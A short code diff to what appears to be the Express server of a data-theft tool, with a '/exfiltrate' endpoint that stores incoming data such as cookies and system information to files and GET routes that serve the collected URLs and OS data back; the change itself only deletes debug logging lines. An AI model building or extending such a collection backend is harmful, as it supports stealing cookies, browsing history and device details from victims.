@@ -42,7 +42,6 @@ app.post('/exfiltrate', (req, res) => {
             fs.writeFileSync(filePath, csvHeader + csvContent, "utf8");
             break;
         case 'os':
-            console.log("OS DATA")
             system_info = data;
             // Save Cookies to a file
             break;
@@ -75,8 +74,6 @@ app.get('/get-urls', (req, res) => {
 
 
 app.get('/get-os', (req, res) => {
-    console.log("THIS WAS CALLEd");
-    console.log(system_info);
     if (system_info)
         res.json(system_info);
 });
